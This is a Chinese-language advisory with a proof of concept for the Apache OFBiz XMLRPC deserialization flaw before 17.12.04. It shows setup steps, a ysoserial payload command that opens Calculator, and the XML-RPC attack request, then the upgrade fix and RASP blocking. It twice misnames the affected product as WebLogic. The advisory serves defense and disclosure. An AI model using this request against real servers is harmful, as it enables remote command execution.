背景介绍      

     Apache OFBiz是一个非常著名的电子商务平台，是一个非常著名的开源项目，提供了创建基于最新J2EE/XML规范和技术标准，构建大中型企业级、跨平台、跨数据库、跨应用服务器的多层、分布式电子商务类WEB应用系统的框架。OFBiz最主要的特点是OFBiz提供了一整套的开发基于Java的web应用程序的组件和工具。包括实体引擎, 服务引擎, 消息引擎, 工作流引擎, 规则引擎等。


漏洞详情

     其17.12.04版本之前的XMLRPC接口存在一处反序列化漏洞，攻击者利用这个漏洞可以在目标服务器上执行任意命令。


    目前影响范围波及下面这些WebLogic版本：

  • < 17.12.04版本



Exploit

  • 从官方下载一款在波及范围内的WebLogic，这里测试的是

    apache-ofbiz-17.12.01

wget http://archive.apache.org/dist/ofbiz/apache-ofbiz-17.12.01.zip

unzip apache-ofbiz-17.12.01.zipcd apache-ofbiz-17.12.01

sh gradle/init-gradle-wrapper.sh./gradlew wrapper --gradle-version=6.8.3./gradlew cleanAll loadAll

    • 生成base64-payload


      java -jar ysoserial-master-8eb5cbfbf6-1.jar CommonsBeanutils1 "/Applications/Calculator.app/Contents/MacOS/Calculator" | base64 | tr -d "\n"

    • 用postman发送攻击请求

      <?xml version="1.0"?><methodCall>  <methodName>ProjectDiscovery</methodName>  <params>    <param>      <value>        <struct>          <member>            <name>test</name>            <value>              <serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">[base64-payload]</serializable>            </value>          </member>        </struct>      </value>    </param>  </params></methodCall>

官方修复方法

升级到17.12.04及以上版本



拓展-Rasp防攻击效果

  • 开启Rasp防护功能后，再次发送攻击Payload，就会发现无法再弹出上面所示的计算机程序了，因为Rasp阻断了命令执行的攻击，观察Rasp日志：


    可以看到已经拦截了命令执行的堆栈。



推荐与寄语

除了官方推荐的升级到安全版本的策略外，在生产环境，往往有大量的老旧应用是无法随意重启的，所以面对大多数情况，RASP可以起到应急规避风险的作用，RASP除了能够阻断反序列化引起的命令执行、sql注入等诸多漏洞的攻击，还能有效防御诸如Tomcat、Jetty、WebLogic等中间件引起的信息泄露问题。
